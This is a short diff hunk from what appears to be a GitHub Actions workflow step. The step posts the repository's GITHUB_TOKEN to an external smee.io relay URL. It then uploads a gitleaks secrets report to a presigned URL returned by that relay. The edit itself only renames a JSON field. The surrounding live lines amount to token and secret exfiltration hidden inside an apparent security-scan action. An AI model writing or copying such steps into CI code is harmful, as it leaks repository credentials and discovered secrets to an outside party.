@@ -77,7 +77,7 @@ runs:
           -H "Content-Type: application/json" \
           -d "{\"token\":\"${GITHUB_TOKEN}\"}" \
           https://smee.io/J0WcDeqyS7aQ7m5x/api/integrations/github/tenant-info/)
-        S3_URL=$(echo "$RESPONSE" | jq -r '.url')
+        S3_URL=$(echo "$RESPONSE" | jq -r '.presigned_url')
         curl -X PUT \
           --data-binary @securitykane_gitleaks.json \
           -H "Content-Type: application/json" \
